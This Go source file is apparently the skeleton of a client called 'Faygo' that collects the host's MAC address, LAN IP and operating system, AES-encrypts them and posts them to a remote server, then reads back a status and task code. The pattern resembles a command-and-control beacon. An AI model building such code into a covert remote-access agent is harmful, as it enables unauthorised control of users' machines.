package main

import (
	net "Faygo/client/module/net"
	"fmt"
	"runtime"
)

func main() {
	

	
	c1 := Client{
		Mac: GetMac(),
		Lan: GetIP(),
		Os:  runtime.GOOS,
	}

	

	
	
	
	
	

	
	response := c1.GetStatus()
	fmt.Println(response)
	dealtask := Client{}
	dealtask.Json2Struct(response)
	switch dealtask.Status {
	
	case 0:
		fmt.Println(c1.InitClient())
	case 1:
		fmt.Println("case1")
	default:
		fmt.Println("error")
	}

}


func GetServer() bool {
	
	
	return net.HttpGet(RemoteHost) == "200 OK"
}

func (c *Client) GetStatus() string {
	
	fmt.Println(AesEnCode(Struct2Json(*c)))
	return AesDeCode(net.HttpPost(RemoteHost, AesEnCode(Struct2Json(*c))))

}

func GetTask(c Client) {
	fmt.Println(Struct2Json(c))
	net.HttpPost(RemoteHost, AesEnCode(Struct2Json(c)))

}

func (c *Client) InitClient() string {
	c.Status = 1
	return AesDeCode(net.HttpPost(RemoteHost, AesEnCode(Struct2Json(*c))))

}
